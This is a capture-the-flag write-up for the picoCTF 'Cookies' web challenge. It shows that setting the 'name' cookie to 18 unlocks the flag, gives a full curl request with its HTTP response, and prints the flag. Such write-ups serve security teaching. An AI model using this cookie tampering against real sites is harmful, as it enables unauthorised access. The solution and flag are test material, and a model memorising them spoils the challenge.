# Cookies

## Category - Web Exploitation
## Author - MADSTACKS

### Description: 
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:6418/

### Solution:
The challenge gives us a link which opens a webpage allowing us to input the name of a cookie. By clicking on 'Search' after typing in the name of a cookie we will either get
the error message "That doesn't appear to be a valid cookie." or we will get a success message saying "That is a cookie! Not very special though..." Seeing as we might need to
find the "special" cookie to get the flag we look at what is actually being modified on the webpage when checking our input. Taking a hint from the name of the challenge "Cookies"
we can use a Google Chrome Extension called editthiscookie to inspect the cookies on the page. There is only one cookie called "name" holding a single integer value of "0" after 
typing in "snickerdoodle" as the search box hinted us to do. Trying increasingly large values for this name cookie we see that the type of cookie changes with each one. Finally
after trying a variety of different cookies, the integer value of "18" for the "name" cookie gives us the flag.

Alternatively this challenge could have been done with a curl command that passes in the correct cookie value of 18 as such:
```
zerodaytea@Patryk:/mnt/d/Coding/CTFs/PicoCTF2021/WebExploitation$ curl -v --cookie "name=18" http://mercury.picoctf.net:6418/check
*   Trying 18.189.209.142:6418...
* TCP_NODELAY set
* Connected to mercury.picoctf.net (18.189.209.142) port 6418 (#0)
> GET /check HTTP/1.1
> Host: mercury.picoctf.net:6418
> User-Agent: curl/7.68.0
> Accept: */*
> Cookie: name=18
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 1184
<
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

* Connection #0 to host mercury.picoctf.net left intact
</html>
```

### Flag:
```
picoCTF{3v3ry1_l0v3s_c00k135_88acab36}
```
